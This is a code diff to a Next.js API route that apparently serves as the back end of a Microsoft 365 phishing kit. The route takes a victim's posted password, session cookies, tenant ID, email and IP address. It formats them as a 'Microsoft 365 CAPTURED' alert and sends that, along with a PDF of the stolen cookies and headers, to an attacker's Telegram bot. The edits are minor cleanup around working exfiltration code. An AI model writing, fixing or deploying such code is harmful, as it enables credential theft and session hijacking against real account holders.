@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server'
-import { PDFDocument, StandardFonts, rgb } from 'pdf-lib'
+import { PDFDocument, StandardFonts, error, rgb } from 'pdf-lib'
 const FormData = require('form-data')
 
 // ✅ FIXED: Proper typing for PDF options
@@ -61,7 +61,7 @@ async function generateMicrosoftPDF(cookiesStr: string, email: string, tenantId:
   if (headersSection.length) {
     const headerPage = pdfDoc.addPage([612, 792])
     const hFont = await pdfDoc.embedFont(StandardFonts.HelveticaBold)
-    let hy = height - 50  // ✅ FIXED: Variable declared properly
+    let hy = height - 50  
     headerPage.drawText('Captured Headers', { x: 50, y: hy, size: 14, font: hFont, color: rgb(0, 0.5, 0) } as PDFTextOptions)
     hy -= 30
     
@@ -86,7 +86,7 @@ function getClientIP(request: NextRequest): string {
 export async function POST(request: NextRequest) {
   try {
     const data = await request.json()
-    const ip = getClientIP(request)  // ✅ FIXED: Proper IP typing
+    const ip = getClientIP(request)  
     
     const tenantId = data.tenantId || data.tid || 'Unknown'
     const userPrincipal = data.upn || data.email || 'Unknown'
@@ -103,18 +103,18 @@ export async function POST(request: NextRequest) {
     
     const alertText = `💀 *Microsoft 365 CAPTURED*\n\n⏰ *${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}*\n🌐 *IP:* \`${ip}\`\n\n👤 *User:* \`${userPrincipal}\`\n🏢 *Tenant ID:* \`${tenantId}\`\n🔐 *Password:* \`${data.password || 'N/A'}\`\n\n📊 *Cookies:* ${data.cookies ? `${(data.cookies.length / 1024).toFixed(1)}KB (${data.cookies.split(';').length} cookies)` : 'None'}\n🔗 *Domain:* \`${domain}\`\n💻 *UA:* ${request.headers.get('user-agent')?.substring(0, 100)}...\n\n📄 *Session PDF* → next`
 
-    // Text alert
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: alertText,
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      }),
-    })
-
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    chat_id: process.env.TELEGRAM_CHAT_ID,
+    text: alertText,
+    parse_mode: 'Markdown',
+    disable_web_page_preview: true
+  }),
+})
+console.log('✅ Telegram: Capture sent')
+    
     // PDF document
     const formData = new FormData()
     ;(formData as any).append('chat_id', process.env.TELEGRAM_CHAT_ID)
